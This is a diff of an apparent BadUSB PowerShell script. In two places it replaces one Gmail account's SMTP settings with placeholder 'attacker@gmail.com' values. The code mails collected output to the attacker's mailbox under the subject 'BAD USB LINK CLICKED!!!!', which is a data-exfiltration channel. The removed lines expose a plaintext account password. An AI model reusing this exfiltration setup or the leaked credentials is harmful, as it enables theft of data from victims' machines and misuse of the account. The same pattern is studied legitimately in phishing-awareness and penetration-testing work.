@@ -54,10 +54,10 @@ Param ()
 }
 
 $SmtpServer = 'smtp.gmail.com'
-$SmtpUser = 'firmusphising@gmail.com'
-$smtpPassword = 'Firmus@123'
-$MailtTo = 'firmusphising@gmail.com'
-$MailFrom = 'firmusphising@gmail.com'
+$SmtpUser = 'attacker@gmail.com'
+$smtpPassword = 'password@123'
+$MailtTo = 'attacker@gmail.com'
+$MailFrom = 'attacker@gmail.com'
 $MailSubject = "BAD USB LINK CLICKED!!!!"
 $Content  = $output
 $Credentials = New-Object System.Management.Automation.PSCredential -ArgumentList $SmtpUser, $($smtpPassword | ConvertTo-SecureString -AsPlainText -Force) 
@@ -134,10 +134,10 @@ Param ()
 
 $SmtpServer = 'smtp.gmail.com'
 $SmtpPort = 587
-$SmtpUser = 'firmusphising@gmail.com'
-$smtpPassword = 'Firmus@123'
-$MailtTo = 'firmusphising@gmail.com'
-$MailFrom = 'firmusphising@gmail.com'
+$SmtpUser = 'attacker@gmail.com'
+$smtpPassword = 'password@123'
+$MailtTo = 'attacker@gmail.com'
+$MailFrom = 'attacker@gmail.com'
 $MailSubject = "BAD USB LINK CLICKED!!!!"
 $Content  = $output
 $Credentials = New-Object System.Management.Automation.PSCredential -ArgumentList $SmtpUser, $($smtpPassword | ConvertTo-SecureString -AsPlainText -Force) 
